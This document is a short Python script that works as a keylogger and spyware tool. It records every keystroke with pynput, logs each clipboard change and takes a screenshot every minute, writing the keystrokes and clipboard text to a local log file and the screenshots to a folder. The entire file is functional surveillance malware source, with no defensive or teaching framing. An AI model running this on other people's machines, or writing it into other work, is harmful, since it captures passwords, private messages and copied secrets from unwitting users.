# pip install pyautogui pillow
import pyautogui
from datetime import datetime
import os
# pip install pynput
from pynput.keyboard import Listener
import time
# pip install pyperclip
import pyperclip
import threading

# Directory for screenshots
if not os.path.exists('screenshots'):
    os.makedirs('screenshots')

# Buffers to store changes
clipboard_buffer = []
keylog_buffer = []

# Screenshot function
def screenshot():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join('screenshots', f"screenshot_{timestamp}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

# Clipboard monitoring function
def clipboard_monitor():
    previous_clipboard = ""
    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard != previous_clipboard:
            previous_clipboard = current_clipboard
            clipboard_buffer.append(
                f"\n--------------------- Clipboard Changed ---------------------\n{current_clipboard}\n-------------------------------------------------------------\n"
            )
        time.sleep(1)

# Keylogging function
def write(key):
    letter = str(key).replace("'", "")

    # Making log cleaner
    if ".space" in letter:
        letter = ' '
    elif 'enter' in letter:
        letter = '\n'
    elif 'up' in letter or 'down' in letter or  'left' in letter or 'right' in letter or 'shift' in letter or 'ctrl' in letter or 'tab' in letter or 'alt' in letter:
        letter= ''
    elif 'backspace' in letter:
        letter = '(Backspace)'
    
    # Append to the buffer
    keylog_buffer.append(letter)

# Log changes to file every 10 seconds
def update_log():
    while True:
        # Write buffered content to log.txt
        if clipboard_buffer or keylog_buffer:
            with open('log.txt', 'a') as log_file:
                if clipboard_buffer:
                    log_file.writelines(clipboard_buffer)
                    clipboard_buffer.clear()
                if keylog_buffer:
                    log_file.writelines(keylog_buffer)
                    keylog_buffer.clear()
        time.sleep(10)

# Screenshot loop
def screenshot_loop():
    while True:
        screenshot()
        time.sleep(60)

# Start threads
screenshot_thread = threading.Thread(target=screenshot_loop)
screenshot_thread.daemon = True
screenshot_thread.start()

clipboard_thread = threading.Thread(target=clipboard_monitor)
clipboard_thread.daemon = True
clipboard_thread.start()

log_update_thread = threading.Thread(target=update_log)
log_update_thread.daemon = True
log_update_thread.start()

# Keylogger listener
with Listener(on_press=write) as listener:
    listener.join()
